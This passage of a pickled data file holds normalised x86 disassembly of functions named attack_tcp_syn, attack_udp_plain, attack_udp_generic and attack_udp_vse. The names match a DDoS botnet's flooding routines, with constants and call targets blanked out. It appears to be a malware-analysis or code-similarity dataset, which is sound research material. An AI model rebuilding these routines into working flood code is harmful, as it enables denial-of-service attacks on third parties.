p49
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOVZX~EDI,[ESP+0]\nPUSH~0\nMOV~EAX,0\nMOV~AL,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nAND~EDI,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~EBP,EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~<STR>\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],EDX\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],CX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],AX\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],DX\nMOV~[ESP+0],0\nMOV~CL,[ESP+0]\nAND~ECX,0\nMOV~[ESP+0],ECX\nTEST~ECX,ECX\nJLE~FOO\nMOV~ESI,0\nMOV~AL,[ESP+0]\nAND~EAX,0\nSHL~EAX,0\nMOV~EDI,EAX\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+ESI*4],EAX\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ECX+EAX*4]\nLEA~ESI,[EDX+0]\nMOV~BYTEPTR[EDX],0\nMOV~AL,[ESP+0]\nMOV~[EDX+0],AL\nLEA~EAX,[EBX+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~CL,[ESP+0]\nMOV~[EDX+0],CL\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~EAX,[ESP+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~ECX,[ESP+0]\nMOV~EAX,[ECX+EAX*8+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ESI],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nAND~EAX,0\nMOV~[ESI+0],EAX\nMOV~AL,[ESI+0]\nAND~EAX,0\nOR~EAX,0\nMOV~[ESI+0],AL\nMOV~AL,[ESI+0]\nAND~EAX,0\nMOV~DL,[ESP+0]\nAND~EDX,0\nSHL~EDX,0\nOR~EAX,EDI\nOR~EAX,EDX\nMOV~CL,[ESP+0]\nAND~ECX,0\nSHL~ECX,0\nAND~EAX,0\nMOV~DL,[ESP+0]\nAND~EDX,0\nSHL~EDX,0\nOR~EAX,ECX\nOR~EAX,EDX\nMOV~DL,[ESP+0]\nAND~EDX,0\nADD~EDX,EDX\nAND~EAX,0\nMOV~ECX,EBP\nAND~ECX,0\nOR~EAX,EDX\nOR~EAX,ECX\nMOV~[ESI+0],AL\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJZ~FOO\nOR~[ESI+0],0\nSUB~ESP,0\nPUSH~EBX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOV~ESI,[ESP+0]\nINC~ESI\nMOV~[ESP+0],ESI\nADD~ESP,0\nCMP~ESI,[ESP+0]\nJL~FOO\nCMP~[ESP+0],0\nJLE~FOO\nMOV~[ESP+0],0\nMOV~EDX,0\nLEA~EAX,[EBX+0]\nROR~AX,0\nAND~EAX,0\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~EBP,[EAX+EDX*4]\nMOV~EDI,EBP\nLEA~ESI,[EBP+0]\nLEA~EAX,[EDX+EDX*2]\nMOV~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX*8]\nCMP~[EAX+0],0\nJA~FOO\nMOV~EAX,[EAX+0]\nMOV~[ESP+0],EAX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nLEA~EDX,[EDX+EDX*2]\nMOV~EAX,[ESP+0]\nMOV~ECX,0\nMOV~CL,[EAX+EDX*8+0]\nMOV~EAX,[ESP+0]\nSHR~EAX,CL\nADD~EAX,[ESP+0]\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[EBP+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],EAX\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~EBX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~[EDI+0],0\nSUB~ESP,0\nPUSH~0\nPUSH~EDI\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~[ESI+0],0\nLEA~EAX,[EBX+0]\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~DX,[ESI+0]\nMOV~ECX,[ESP+0]\nMOV~[ECX+EAX*8+0],DX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~0\nLEA~EAX,[EBX+0]\nPUSH~EAX\nPUSH~EBP\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EDX,[ESP+0]\nINC~EDX\nMOV~[ESP+0],EDX\nADD~ESP,0\nCMP~EDX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p50
L1254L
tp51
a(S'attack_tcp_syn'
p52
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOV~BL,[ESP+0]\nPUSH~0\nMOV~EAX,0\nMOV~AL,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nAND~EBX,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~EBP,EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~EDI,EAX\nPUSH~<STR>\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],EDX\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],CX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],AX\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],DX\nMOV~CL,[ESP+0]\nMOV~[ESP+0],CL\nMOV~[ESP+0],0\nMOV~AL,[ESP+0]\nAND~EAX,0\nMOV~[ESP+0],EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~EBX,0\nMOV~AL,CL\nAND~EAX,0\nSHL~EAX,0\nMOV~[ESP+0],AL\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ECX+EAX*4]\nLEA~ESI,[EDX+0]\nLEA~EBX,[EDX+0]\nMOV~BYTEPTR[EDX],0\nMOV~AL,[ESP+0]\nMOV~[EDX+0],AL\nMOV~[EDX+0],0\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~CL,[ESP+0]\nMOV~[EDX+0],CL\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~EAX,[ESP+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~ECX,[ESP+0]\nMOV~EAX,[ECX+EAX*8+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ESI],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nAND~EAX,0\nMOV~[ESI+0],EAX\nMOV~AL,[ESI+0]\nAND~EAX,0\nOR~EAX,0\nMOV~[ESI+0],AL\nMOV~AL,[ESI+0]\nAND~EAX,0\nMOV~DL,[ESP+0]\nAND~EDX,0\nSHL~EDX,0\nOR~AL,[ESP+0]\nOR~EAX,EDX\nMOV~CL,[ESP+0]\nAND~ECX,0\nSHL~ECX,0\nAND~EAX,0\nMOV~DL,[ESP+0]\nAND~EDX,0\nSHL~EDX,0\nOR~EAX,ECX\nOR~EAX,EDX\nMOV~EDX,EBP\nAND~EDX,0\nADD~EDX,EDX\nAND~EAX,0\nMOV~ECX,EDI\nAND~ECX,0\nOR~EAX,EDX\nOR~EAX,ECX\nMOV~[ESI+0],AL\nMOV~BYTEPTR[EBX],0\nMOV~[EBX+0],0\nCALL~FOO\nAND~EAX,0\nADD~EAX,0\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nCALL~FOO\nMOV~[EBX+0],EAX\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~EBX,[ESP+0]\nINC~EBX\nMOV~[ESP+0],EBX\nCMP~EBX,[ESP+0]\nJL~FOO\nCMP~[ESP+0],0\nJLE~FOO\nMOV~[ESP+0],0\nMOV~EAX,0\nMOV~EDX,[ESP+0]\nMOV~EBP,[EDX+EAX*4]\nMOV~EDI,EBP\nLEA~ESI,[EBP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~ECX,[ESP+0]\nLEA~EAX,[ECX+EAX*8]\nCMP~[EAX+0],0\nJA~FOO\nMOV~EBX,[EAX+0]\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nLEA~EDX,[EDX+EDX*2]\nMOV~EAX,[ESP+0]\nMOV~ECX,0\nMOV~CL,[EAX+EDX*8+0]\nMOV~EAX,[ESP+0]\nSHR~EAX,CL\nADD~EAX,EBX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[EBP+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],EAX\nCMP~[ESP+0],0\nJZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~[EDI+0],0\nSUB~ESP,0\nPUSH~0\nPUSH~EDI\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~[ESI+0],0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~DX,[ESI+0]\nMOV~ECX,[ESP+0]\nMOV~[ECX+EAX*8+0],DX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~EBP\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p53
L1198L
tp54
a(S'attack_udp_plain'
p55
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nMOVZX~EBP,[ESP+0]\nMOVZX~ESI,[ESP+0]\nMOV~EAX,EBP\nAND~EAX,0\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~EDX,ESI\nAND~EDX,0\nMOV~EDI,EDX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~EDX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~EDI\nCALL~FOO\nMOV~ESI,EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],AL\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nADD~ESP,0\nCMP~SI,0\nJNZ~FOO\nCALL~FOO\nMOV~[ESP+0],AX\nJMP~FOO\nROR~SI,0\nMOV~[ESP+0],SI\nMOV~EAX,EBP\nAND~EAX,0\nMOV~[ESP+0],EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~ESI,[ESP+0]\nMOV~EDI,0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EDI*4-0],EAX\nADD~ESP,0\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nJMP~FOO\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,EAX\nMOV~[ESP+0],EDI\nMOV~EAX,[ESP+0]\nMOV~[EAX+EDI*4-0],EDX\nADD~ESP,0\nCMP~EDX,0\nJZ~FOO\nMOV~[ESP+0],0\nMOV~AX,[ESP+0]\nMOV~[ESP+0],AX\nMOV~[ESP+0],0\nLEA~EAX,[ESP+0]\nSUB~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~EDX\nCALL~FOO\nMOV~EBP,ESI\nADD~ESP,0\nCMP~[ESI+0],0\nJA~FOO\nMOV~EBX,[ESI+0]\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nCALL~FOO\nMOV~ECX,0\nMOV~CL,[ESI+0]\nSHR~EAX,CL\nADD~EAX,EBX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[ESI+0],EAX\nSUB~ESP,0\nPUSH~0\nPUSH~EBP\nMOV~EDX,[ESP+0]\nMOV~EAX,[ESP+0]\nPUSH~[EAX+EDX*4-0]\nCALL~FOO\nINC~EDI\nADD~ESI,0\nMOV~EAX,[ESP+0]\nINC~EAX\nADD~ESP,0\nCMP~EAX,EDI\nJNZ~FOO\nCMP~[ESP+0],0\nJLE~FOO\nMOV~EBX,0\nMOV~EDI,[ESP+0]\nAND~EDI,0\nMOV~EBP,[ESP]\nINC~EBP\nMOV~EDX,[ESP+0]\nMOV~ESI,[EDX+EBX*4-0]\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nMOV~EAX,[ESP+0]\nPUSH~[EAX+EBX*4-0]\nCALL~FOO\nINC~EBX\nADD~ESP,0\nCMP~EBX,EBP\nJNZ~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p56
L566L
tp57
a(S'attack_udp_generic'
p58
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOVZX~ESI,[ESP+0]\nPUSH~0\nMOV~EAX,0\nMOV~AL,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nAND~ESI,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~EBP,EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~<STR>\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],EDX\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],CX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],AX\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],DX\nMOV~[ESP+0],EBX\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],CX\nCMP~CX,0\nJBE~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~BL,[ESP+0]\nAND~EBX,0\nMOV~[ESP+0],EBX\nTEST~EBX,EBX\nJLE~FOO\nMOV~EBX,0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nMOV~ESI,EAX\nROR~SI,0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ECX+EAX*4]\nLEA~ECX,[EDX+0]\nMOV~BYTEPTR[EDX],0\nMOV~BL,[ESP+0]\nMOV~[EDX+0],BL\nMOV~[EDX+0],SI\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~AL,[ESP+0]\nMOV~[EDX+0],AL\nADD~ESP,0\nMOV~EBX,EBP\nTEST~BL,BL\nJZ~FOO\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~EAX,[ESP+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~EBX,[ESP+0]\nMOV~EAX,[EBX+EAX*8+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ECX],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[ECX+0],AX\nMOV~EAX,[ESP+0]\nADD~EAX,0\nROR~AX,0\nMOV~[ECX+0],AX\nMOV~EBX,[ESP+0]\nINC~EBX\nMOV~[ESP+0],EBX\nCMP~[ESP+0],EBX\nJG~FOO\nCMP~[ESP+0],0\nJLE~FOO\nMOV~[ESP+0],0\nMOV~EAX,0\nMOV~EBX,[ESP+0]\nAND~EBX,0\nLEA~EDX,[EBX+0]\nMOV~[ESP+0],EDX\nMOV~ECX,[ESP+0]\nMOV~EBP,[ECX+EAX*4]\nMOV~EDI,EBP\nLEA~ESI,[EBP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX*8]\nCMP~[EAX+0],0\nJA~FOO\nMOV~EAX,[EAX+0]\nMOV~[ESP+0],EAX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nLEA~EDX,[EDX+EDX*2]\nMOV~EAX,[ESP+0]\nMOV~ECX,0\nMOV~CL,[EAX+EDX*8+0]\nMOV~EAX,[ESP+0]\nSHR~EAX,CL\nADD~EAX,[ESP+0]\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[EBP+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~EBX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~[EDI+0],0\nSUB~ESP,0\nPUSH~0\nPUSH~EDI\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~[ESI+0],0\nLEA~EAX,[EBX+0]\nPUSH~EAX\nMOV~AX,[ESI+0]\nAND~EAX,0\nPUSH~EAX\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~DX,[ESI+0]\nMOV~ECX,[ESP+0]\nMOV~[ECX+EAX*8+0],DX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~0\nPUSH~[ESP+0]\nPUSH~EBP\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p59
L959L
tp60
a(S'attack_udp_vse'
p61
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOV~BL,[ESP+0]\nPUSH~0\nMOV~EAX,0\nMOV~AL,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nAND~EBX,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~EBP,EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~EDI,EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~EBX,EAX\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nC